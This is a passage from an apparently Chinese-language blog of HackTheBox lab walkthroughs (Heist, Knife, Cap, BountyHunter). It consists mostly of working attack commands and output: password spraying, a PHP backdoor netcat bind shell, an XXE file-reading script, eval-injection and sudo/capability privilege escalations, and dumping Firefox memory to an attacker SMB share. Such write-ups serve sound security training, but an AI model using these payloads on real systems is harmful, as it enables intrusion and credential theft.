href="https://www.ifm.net.nz/cookbooks/passwordcracker.html">https://www.ifm.net.nz/cookbooks/passwordcracker.html</a>)</li><li>md5直接john爆破</li></ul><p>得到一些账户</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rout3r:<span class="variable">$uperP</span>@ssword</span><br><span class="line">admin:Q4)sJu\Y8qz*A3?d</span><br><span class="line">secret:stealth1agent</span><br></pre></td></tr></table></figure><p>测试hazard的密码(由于未知原因，hydra不能爆破SMB)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.10.149 -u hazard -p stealth1agent</span><br><span class="line">        </span><br><span class="line">  Disk                                                    Permissions Comment</span><br><span class="line">  ----                                                    ----------- -------</span><br><span class="line">  ADMIN$                                              NO ACCESS Remote Admin</span><br><span class="line">  C$                                                  NO ACCESS Default share</span><br><span class="line">  IPC$                                                READ ONLY Remote IPC</span><br></pre></td></tr></table></figure><p>枚举域账户信息</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">python lookupsid.py hazard:stealth1agent@heist</span><br><span class="line"></span><br><span class="line">500: SUPPORTDESK\Administrator (SidTypeUser)</span><br><span class="line">501: SUPPORTDESK\Guest (SidTypeUser)</span><br><span class="line">503: SUPPORTDESK\DefaultAccount (SidTypeUser)</span><br><span class="line">504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)</span><br><span class="line">513: SUPPORTDESK\None (SidTypeGroup)</span><br><span class="line">1008: SUPPORTDESK\Hazard (SidTypeUser)</span><br><span class="line">1009: SUPPORTDESK\support (SidTypeUser)</span><br><span class="line">1012: SUPPORTDESK\Chase (SidTypeUser)</span><br><span class="line">1013: SUPPORTDESK\Jason (SidTypeUser)</span><br></pre></td></tr></table></figure><p>字典</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cat user</span><br><span class="line"></span><br><span class="line">hazard</span><br><span class="line">administrator</span><br><span class="line">admin</span><br><span class="line">rout3r</span><br><span class="line">admin</span><br><span class="line">secret</span><br><span class="line">support</span><br><span class="line">Chase</span><br><span class="line">------</span><br><span class="line">cat pass</span><br><span class="line"></span><br><span class="line"><span class="variable">$uperP</span>@ssword</span><br><span class="line">Q4)sJu\Y8qz*A3?d</span><br><span class="line">stealth1agent</span><br></pre></td></tr></table></figure><p>爆破winrm服务</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec winrm 10.10.10.149 -d heist -u user -p pass</span><br><span class="line"></span><br><span class="line">WINRM       10.10.10.149    5985   10.10.10.149     [+] heist\Chase:Q4)sJu\Y8qz*A3?d (Pwn3d!)</span><br></pre></td></tr></table></figure><p>winrm登入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.149 -u chase -p <span class="string">&quot;Q4)sJu\Y8qz*A3?d&quot;</span></span><br><span class="line"><span class="built_in">type</span> c:\users\chase\desktop\user.txt</span><br><span class="line"></span><br><span class="line">a127daef77ab6d9d92008653295f59c4</span><br></pre></td></tr></table></figure><h2 id="权限提升-10"><a class="markdownIt-Anchor" href="#权限提升-10"></a> 权限提升</h2><p>查看进程</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br><span class="line"></span><br><span class="line">    378      28    25008      62440       1.16   6216   1 firefox</span><br><span class="line">    355      25    16444      38908       0.27   6564   1 firefox</span><br><span class="line">   1050      73   172600     248916      13.88   6732   1 firefox</span><br><span class="line">    347      19     9972      34476       0.23   6844   1 firefox</span><br><span class="line">    401      34    40728     101244       3.31   6956   1 firefox</span><br></pre></td></tr></table></figure><p>可以看看firefox进程内存</p><p>开启HTTP服务与SMB服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 9998&amp;</span><br><span class="line">python smbserver.py Bufferfly . -smb2support -username Buffer -password fly&amp;</span><br></pre></td></tr></table></figure><p>上传procdump并回传firefox进程内存</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget -uri http://10.10.16.14:9998/procdump64.exe -outfile procdump64.exe</span><br><span class="line">./procdump64.exe -accepteula -ma 6216</span><br><span class="line">net use \\10.10.16.14\Bufferfly /u:Buffer fly</span><br><span class="line">copy firefox.exe_210706_221007.dmp \\10.10.16.14\Bufferfly\</span><br><span class="line">net use /d \\10.10.16.14\Bufferfly</span><br></pre></td></tr></table></figure><p>查找admin相关信息</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grep -a admin firefox.exe_210706_221007.dmp</span><br><span class="line"></span><br><span class="line">localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5&#125;x/re8]FBuZ</span><br></pre></td></tr></table></figure><p>wimrm登入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.149 -u administrator -p <span class="string">&#x27;4dD!5&#125;x/re8]FBuZ&#x27;</span></span><br><span class="line"><span class="built_in">type</span> c:\users\administrator\desktop\root.txt</span><br><span class="line"></span><br><span class="line">50dfa3c6bfd20e2e0d071b073d766897</span><br></pre></td></tr></table></figure><p>还是没想通为啥hydra爆不了smb，以后有机会再试试</p><hr /><h1 id="hachthebox_knife"><a class="markdownIt-Anchor" href="#hachthebox_knife"></a> HachTheBox_Knife</h1><h2 id="端口扫描-11"><a class="markdownIt-Anchor" href="#端口扫描-11"></a> 端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -Pn -T5 10.10.10.242</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.242</span><br><span class="line">Host is up (0.36s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-10"><a class="markdownIt-Anchor" href="#漏洞利用-10"></a> 漏洞利用</h2><p>得到PHP版本信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl -I http://10.10.10.242/</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Thu, 05 Aug 2021 05:54:34 GMT</span><br><span class="line">Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line">X-Powered-By: PHP/8.1.0-dev</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br></pre></td></tr></table></figure><p>查询得到相关漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">searchsploit php 8.1 dev</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                             |  Path</span><br><span class="line">----------------------------------------------------------- ---------------------------------</span><br><span class="line">PHP 8.1.0-dev - &#39;User-Agentt&#39; Remote Code Execution        | php&#x2F;webapps&#x2F;49933.py</span><br><span class="line">----------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line">Papers: No Results</span><br></pre></td></tr></table></figure><p>将Bash开放到目标服务器9876端口，并用nc连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">&quot;User-Agentt: zerodiumsystem(&#x27;mkfifo /tmp/bufferfly; cat /tmp/bufferfly | /bin/bash -i 2&gt;&amp;1 | nc -l 9876 &gt; /tmp/bufferfly&#x27;);&quot;</span> http://10.10.10.242/</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc 10.10.10.242 9876</span><br><span class="line">cat /home/james/user.txt</span><br><span class="line"></span><br><span class="line">71a8b414816d223319c095a64edbae6c</span><br></pre></td></tr></table></figure><h2 id="权限提升-11"><a class="markdownIt-Anchor" href="#权限提升-11"></a> 权限提升</h2><p>查看sudo权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> james on knife:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User james may run the following commands on knife:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/knife</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root knife <span class="built_in">exec</span> --<span class="built_in">exec</span> <span class="string">&quot;exec &#x27;/bin/bash -i&#x27;&quot;</span></span><br><span class="line">cat /root/root.txt</span><br><span class="line"></span><br><span class="line">6fa9527622b5b0396511a575bd529b42</span><br></pre></td></tr></table></figure><hr /><h1 id="hachthebox_cap"><a class="markdownIt-Anchor" href="#hachthebox_cap"></a> HachTheBox_Cap</h1><h2 id="端口扫描-12"><a class="markdownIt-Anchor" href="#端口扫描-12"></a> 端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -Pn -T5 10.10.10.245</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.245</span><br><span class="line">Host is up (0.28s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    gunicorn</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-11"><a class="markdownIt-Anchor" href="#漏洞利用-11"></a> 漏洞利用</h2><p>下载流量包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O http://10.10.10.245/download/0</span><br><span class="line">wireshark 0</span><br></pre></td></tr></table></figure><p>得到FTP登入凭证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nathan:Buck3tH4TF0RM3!</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh nathan@10.10.10.245</span><br><span class="line">Buck3tH4TF0RM3!</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /home/nathan/user.txt</span><br><span class="line"></span><br><span class="line">f514ef062a27e672c5e88001061d8c5a</span><br></pre></td></tr></table></figure><h2 id="权限提升-12"><a class="markdownIt-Anchor" href="#权限提升-12"></a> 权限提升</h2><p>查看capability</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getcap</span> /* -r 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip</span><br><span class="line">/usr/bin/ping = cap_net_raw+ep</span><br><span class="line">/usr/bin/traceroute6.iputils = cap_net_raw+ep</span><br><span class="line">/usr/bin/mtr-packet = cap_net_raw+ep</span><br><span class="line">/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep</span><br></pre></td></tr></table></figure><p>使用python进行提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/python3.8 -c <span class="string">&#x27;import os;os.setuid(0);os.system(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">cat /root/root.txt</span><br><span class="line"></span><br><span class="line">64941cc0edb38d723f72d34453780c90</span><br></pre></td></tr></table></figure><hr /><h1 id="hachthebox_bountyhunter"><a class="markdownIt-Anchor" href="#hachthebox_bountyhunter"></a> HachTheBox_BountyHunter</h1><h2 id="端口扫描-13"><a class="markdownIt-Anchor" href="#端口扫描-13"></a> 端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -Pn -T5  10.10.11.100</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.100</span><br><span class="line">Host is up (0.25s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h2 id="路径扫描-3"><a class="markdownIt-Anchor" href="#路径扫描-3"></a> 路径扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dirb http://10.10.11.100/ -X .php</span><br><span class="line"></span><br><span class="line">+ http://10.10.11.100/db.php (CODE:200|SIZE:0) </span><br></pre></td></tr></table></figure><h2 id="漏洞利用-12"><a class="markdownIt-Anchor" href="#漏洞利用-12"></a> 漏洞利用</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line">file = <span class="built_in">input</span>()</span><br><span class="line">payload = &#123;<span class="string">&quot;data&quot;</span>:base64.b64encode((<span class="string">&quot;&quot;&quot;&lt;?xml  version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=&quot;&quot;&quot;</span> + file + <span class="string">&quot;&quot;&quot;\&quot;&gt;]&gt;</span></span><br><span class="line"><span class="string">        &lt;bugreport&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;&amp;xxe;&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;cwe&gt;2&lt;/cwe&gt;</span></span><br><span class="line"><span class="string">        &lt;cvss&gt;3&lt;/cvss&gt;</span></span><br><span class="line"><span class="string">        &lt;reward&gt;4&lt;/reward&gt;</span></span><br><span class="line"><span class="string">        &lt;/bugreport&gt;&quot;&quot;&quot;</span>).encode()).decode()&#125;</span><br><span class="line">url = <span class="string">&quot;http://10.10.11.100/tracker_diRbPr00f314.php&quot;</span></span><br><span class="line">res=req.post(url=url, data=payload)</span><br><span class="line">data = res.text</span><br><span class="line">data = data.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">result = base64.b64decode(re.findall(<span class="string">&quot;&lt;td&gt;Title:&lt;/td&gt;    &lt;td&gt;(.*?)&lt;/td&gt;&quot;</span>, data)[<span class="number">0</span>].encode()).decode()</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p>读取/etc/passwd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">development:x:1000:1000:Development:&#x2F;home&#x2F;development:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p>读取db.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TODO -&gt; Implement login system with the database.</span></span><br><span class="line"><span class="variable">$dbserver</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;bounty&quot;</span>;</span><br><span class="line"><span class="variable">$dbusername</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$dbpassword</span> = <span class="string">&quot;m19RoAU0hP41A1sTsq6K&quot;</span>;</span><br><span class="line"><span class="variable">$testuser</span> = <span class="string">&quot;test&quot;</span>;</span><br></pre></td></tr></table></figure><p>登入SSH服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh development@10.10.11.100</span><br><span class="line">m19RoAU0hP41A1sTsq6K</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /home/development/user.txt</span><br><span class="line"></span><br><span class="line">96248cc10e05f03e3b63eb59adfd9d4c</span><br></pre></td></tr></table></figure><h2 id="权限提升-13"><a class="markdownIt-Anchor" href="#权限提升-13"></a> 权限提升</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;home&#x2F;development&#x2F;contract.txt</span><br><span class="line"></span><br><span class="line">Hey team,</span><br><span class="line"></span><br><span class="line">I&#39;ll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.</span><br><span class="line"></span><br><span class="line">This has been our first job since the &quot;rm -rf&quot; incident and we can&#39;t mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.</span><br><span class="line"></span><br><span class="line">I set up the permissions for you to test this. Good luck.</span><br><span class="line"></span><br><span class="line">-- John</span><br></pre></td></tr></table></figure><p>查看sudo权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> development on bountyhunter:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User development may run the following commands on bountyhunter:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py</span><br></pre></td></tr></table></figure><p>查看py文件</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">cat /opt/skytrain_inc/ticketValidator.py</span><br><span class="line"><span class="comment">#Skytrain Inc Ticket Validation System 0.1</span></span><br><span class="line"><span class="comment">#Do not distribute this file.</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_file</span>(<span class="params">loc</span>):</span></span><br><span class="line">    <span class="keyword">if</span> loc.endswith(<span class="string">&quot;.md&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(loc, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;Wrong file type.&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">evaluate</span>(<span class="params">ticketFile</span>):</span></span><br><span class="line">    <span class="comment">#Evaluates a ticket to check for ireggularities.</span></span><br><span class="line">    code_line = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> i,x <span class="keyword">in</span> <span class="built_in">enumerate</span>(ticketFile.readlines()):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> x.startswith(<span class="string">&quot;# Skytrain Inc&quot;</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> x.startswith(<span class="string">&quot;## Ticket to &quot;</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            print(<span class="string">f&quot;Destination: <span class="subst">&#123;<span class="string">&#x27; &#x27;</span>.join(x.strip().split(<span class="string">&#x27; &#x27;</span>)[<span class="number">3</span>:])&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> x.startswith(<span class="string">&quot;__Ticket Code:__&quot;</span>):</span><br><span class="line">            code_line = i+<span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> code_line <span class="keyword">and</span> i == code_line:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> x.startswith(<span class="string">&quot;**&quot;</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            ticketCode = x.replace(<span class="string">&quot;**&quot;</span>, <span class="string">&quot;&quot;</span>).split(<span class="string">&quot;+&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(ticketCode) % <span class="number">7</span> == <span class="number">4</span>:</span><br><span class="line">                validationNumber = <span class="built_in">eval</span>(x.replace(<span class="string">&quot;**&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">                <span class="keyword">if</span> validationNumber &gt; <span class="number">100</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    fileName = <span class="built_in">input</span>(<span class="string">&quot;Please enter the path to the ticket file.\n&quot;</span>)</span><br><span class="line">    ticket = load_file(fileName)</span><br><span class="line">    <span class="comment">#DEBUG print(ticket)</span></span><br><span class="line">    result = evaluate(ticket)</span><br><span class="line">    <span class="keyword">if</span> (result):</span><br><span class="line">        print(<span class="string">&quot;Valid ticket.&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;Invalid ticket.&quot;</span>)</span><br><span class="line">    ticket.close</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>eval()可以进行执行命令</p><p>构造恶意文本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat /tmp/1.md</span><br><span class="line"></span><br><span class="line"><span class="comment"># Skytrain Inc</span></span><br><span class="line"><span class="comment">## Ticket to Bridgeport</span></span><br><span class="line">__Ticket Code:__</span><br><span class="line">**11+<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;/bin/bash&#x27;)&quot;</span>)**</span><br><span class="line"><span class="comment">##Issued: 2021/06/21</span></span><br><span class="line"><span class="comment">#End Ticket</span></span><br></pre></td></tr></table></figure><p>提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py</span><br><span class="line">/tmp/1.md</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br><span class="line"></span><br><span class="line">d8b513ba7130a46641d2c65966f6b8e6</span><br></pre></td></tr></table></figure><hr /><h1 id="hachthebox_intelligence"><a class="markdownIt-Anchor" href="#hachthebox_intelligence"></a> HachTheBox_Intelligence</h1><h2 id="端口扫描-14"><a class="markdownIt-Anchor" 